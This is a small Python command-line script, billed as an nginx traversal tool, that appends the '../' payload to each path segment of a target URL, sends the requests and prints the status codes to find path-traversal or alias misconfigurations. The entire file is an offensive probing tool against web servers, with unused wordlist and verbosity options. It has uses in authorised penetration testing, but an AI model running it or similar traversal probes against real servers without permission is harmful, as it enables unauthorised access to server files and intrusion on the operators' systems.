from urllib.parse import urlparse
import sys
import argparse as ag
import requests as rq

# split the url
# append the payload to each split one at a time
# request with the appended payload

def make_a_request (url):
    resp = rq.get(url, verify=True)
    return str(resp.status_code)

def main():
    argparser = ag.ArgumentParser(description="This is a nginx traversal tool")
    argparser.add_argument("url", type=str, help="URL of the target")
    argparser.add_argument("-v", help="increase verbosity", action="store_true", dest="verbose")
    argparser.add_argument("-d", help="wordlist path", type=str,  dest="wlist")
    argparser.add_argument("-a", help="append segment in the end", action="store_true")

    args = argparser.parse_args()

    payload = "../"

    parser = urlparse(args.url)
    path = parser.path

    segments = path.split("/")
    segments = segments[1: len(segments)-1]

    _str = ""
    _marks = ('-'*80)
    sys.stdout.write("\n{0:50}\t{1}\n{2}\n".format("URL", "Status",_marks))
    for segment in segments:
        _str += "/"+segment
        if(args.a):
            _x = segment
        else:
            _x = ""
        _url = "{}://{}{}{}{}".format(parser.scheme, parser.netloc, _str, payload, _x)
        sys.stdout.write("{0} \033[92m[{1}]\033[00m\n".format(_url, make_a_request(_url)))


if __name__ == '__main__':
    main()